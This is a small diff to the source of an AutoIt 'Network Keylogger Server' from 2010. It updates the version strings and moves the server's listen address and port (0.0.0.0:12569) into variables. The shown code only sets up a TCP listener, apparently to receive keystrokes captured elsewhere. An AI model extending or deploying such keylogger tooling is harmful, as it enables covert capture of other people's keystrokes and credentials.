@@ -1,5 +1,5 @@
 #cs
-	Network Keylogger Server - Server program for Network Keylogger
+	Network Keylogger Server v1.0.0.1 - Server program for Network Keylogger
 	Copyright © 2010 VittGam - NetworkKeylogger@VittGam.net
 
 	License information:
@@ -23,14 +23,14 @@
 #AutoIt3Wrapper_icon=vittgam.ico
 #AutoIt3Wrapper_outfile=network_keylogger_server.exe
 #AutoIt3Wrapper_Compression=4
-#AutoIt3Wrapper_Res_Comment=Network Keylogger Server v1.0 by VittGam
+#AutoIt3Wrapper_Res_Comment=Network Keylogger Server v1.0.0.1 by VittGam
 #AutoIt3Wrapper_Res_Description=Network Keylogger Server
-#AutoIt3Wrapper_Res_Fileversion=1.0.0.0
+#AutoIt3Wrapper_Res_Fileversion=1.0.0.1
 #AutoIt3Wrapper_Res_LegalCopyright=Copyright © 2010 VittGam
 #AutoIt3Wrapper_Res_Field=InternalName|network_keylogger_server
 #AutoIt3Wrapper_Res_Field=ProductName|Network Keylogger Server
 #AutoIt3Wrapper_Res_Field=CompanyName|VittGam (www.VittGam.net)
-#AutoIt3Wrapper_Res_Field=ProductVersion|1.0.0.0
+#AutoIt3Wrapper_Res_Field=ProductVersion|1.0.0.1
 #AutoIt3Wrapper_Res_Field=OriginalFilename|network_keylogger_server.exe
 #AutoIt3Wrapper_Res_SaveSource=n
 #AutoIt3Wrapper_Res_Language=1033
@@ -39,8 +39,11 @@
 #AutoIt3Wrapper_Au3Check_Stop_OnWarning=y
 #EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
 
+Global $listen_bind="0.0.0.0"
+Global $listen_port="12569"
+
 TCPStartup()
-Global $MainSocket=TCPListen("0.0.0.0","12569")
+Global $MainSocket=TCPListen($listen_bind,$listen_port)
 If $MainSocket = -1 Then
 	MsgBox(16,"Network Keylogger Server","Cannot initialize the server at 0.0.0.0:12569.")
 	Exit
